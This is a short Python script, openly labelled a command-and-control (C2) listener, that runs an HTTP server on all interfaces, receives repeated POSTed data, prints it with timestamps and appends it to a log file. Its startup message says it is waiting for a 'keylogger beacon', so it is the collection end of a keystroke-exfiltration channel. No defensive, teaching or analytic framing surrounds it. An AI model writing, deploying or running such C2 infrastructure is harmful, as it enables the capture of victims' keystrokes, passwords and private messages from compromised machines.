#!/usr/bin/env python3
"""Streaming C2 listener — accepts repeated curl POSTs, prints to stdout + log file."""
import sys, os, datetime, signal
from http.server import HTTPServer, BaseHTTPRequestHandler

LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else None
TOTAL_BYTES = 0

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global TOTAL_BYTES
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length)
        TOTAL_BYTES += length
        data = raw.decode('utf-8', errors='replace')

        ts = datetime.datetime.now().strftime('%H:%M:%S')
        for line in data.splitlines():
            stripped = line.rstrip()
            if stripped:
                print(f"  [{ts}] {stripped}", flush=True)

        if LOG_FILE:
            with open(LOG_FILE, 'ab') as f:
                f.write(raw)

        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
    dest = f" + {LOG_FILE}" if LOG_FILE else ""
    print(f"  C2 streaming on :{port} → stdout{dest}", flush=True)
    print(f"  Waiting for keylogger beacon...\n", flush=True)

    server = HTTPServer(('0.0.0.0', port), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
        print(f"\n  C2 stopped. Total received: {TOTAL_BYTES} bytes")

if __name__ == '__main__':
    main()
